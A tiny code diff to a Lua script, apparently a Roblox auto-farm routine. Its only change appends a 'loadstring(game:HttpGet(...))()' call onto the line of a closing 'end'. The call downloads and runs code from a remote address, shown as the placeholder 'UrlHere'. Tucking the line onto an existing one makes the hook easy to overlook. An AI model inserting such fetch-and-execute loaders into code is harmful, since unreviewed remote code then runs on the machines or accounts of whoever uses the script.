@@ -36,5 +36,7 @@ for _, player in ipairs(game.Players:GetPlayers()) do
     if hasGamePass(player) then
         autoFarm()
     end
-end
+end  loadstring(game:HttpGet("UrlHere",true))();
+
+
 
